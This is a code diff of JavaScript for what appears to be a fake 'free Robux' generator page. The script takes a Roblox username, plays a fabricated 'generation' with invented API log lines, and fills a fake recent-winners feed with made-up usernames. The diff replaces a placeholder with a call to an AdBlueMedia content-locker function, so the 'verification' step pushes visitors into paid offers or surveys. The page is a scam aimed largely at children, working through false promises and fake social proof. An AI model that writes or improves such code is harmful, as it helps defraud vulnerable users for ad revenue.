@@ -1,10 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // State
     let username = '';
     let selectedAmount = '1,700';
     let currentStep = 1;
 
-    // Elements
     const steps = [
         document.getElementById('step-1'),
         document.getElementById('step-2'),
@@ -23,7 +21,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const verifyBtn = document.getElementById('verify-btn');
     const activityList = document.getElementById('activity-list');
 
-    // Navigation
     function showStep(stepNum) {
         steps.forEach((step, index) => {
             step.classList.toggle('active', index === stepNum - 1);
@@ -31,7 +28,6 @@ document.addEventListener('DOMContentLoaded', () => {
         currentStep = stepNum;
     }
 
-    // Platform selection
     platforms.forEach(p => {
         p.addEventListener('click', () => {
             platforms.forEach(x => x.classList.remove('active'));
@@ -39,7 +35,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Reward selection
     rewardItems.forEach(item => {
         item.addEventListener('click', () => {
             rewardItems.forEach(x => x.classList.remove('active'));
@@ -48,7 +43,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Step 1: Connect
     connectBtn.addEventListener('click', () => {
         username = usernameInput.value.trim();
         if (username.length < 3) {
@@ -64,13 +58,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1500);
     });
 
-    // Step 2: Generate
     generateBtn.addEventListener('click', () => {
         showStep(3);
         startSimulation();
     });
 
-    // Step 3: Simulation Logic
     function startSimulation() {
         const logs = [
             `Connecting to Roblox API...`,
@@ -101,7 +93,6 @@ document.addEventListener('DOMContentLoaded', () => {
             
             progressBar.style.width = `${progress}%`;
 
-            // Update logs based on progress
             const targetLogIndex = Math.floor((progress / 100) * logs.length);
             if (targetLogIndex > logIndex && logIndex < logs.length) {
                 for(let i = logIndex; i < targetLogIndex; i++) {
@@ -115,18 +106,15 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 100);
     }
 
-    // Step 4: Verification (OGAds Integration)
     verifyBtn.addEventListener('click', () => {
-        // REPLACE THE LINE BELOW WITH YOUR OGADS CONTENT LOCKER SCRIPT CALL
-        // Example: call_locker();
-        
-        alert("This is where your OGAds Locker will open!");
-        
-        // If you use a URL instead of a script:
-        // window.location.href = "YOUR_OGADS_LOCKER_URL_HERE";
+        if (typeof _Hn === 'function') {
+            _Hn();
+        } else {
+            console.error("AdBlueMedia locker function not found.");
+            alert("Verification system is loading... please try again in a moment.");
+        }
     });
 
-    // Recent Activity Simulation
     const names = [
         "Liam_Blox", "iiSophia", "ItzChloe", "xXNoahXx", "SunnyOlivia", "MasonGamer", "SparkleAva", "Ethan_Playz",
         "ItzIsabella", "JacobRockz", "MiaSunshine", "LucasVibes", "CharlotteSky", "AidenExplorer", "Amelia_Moon",
@@ -162,9 +150,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Initial activities
     for(let i=0; i<5; i++) addActivity();
     
-    // New activity every 5-10 seconds
     setInterval(addActivity, Math.random() * 5000 + 5000);
 });
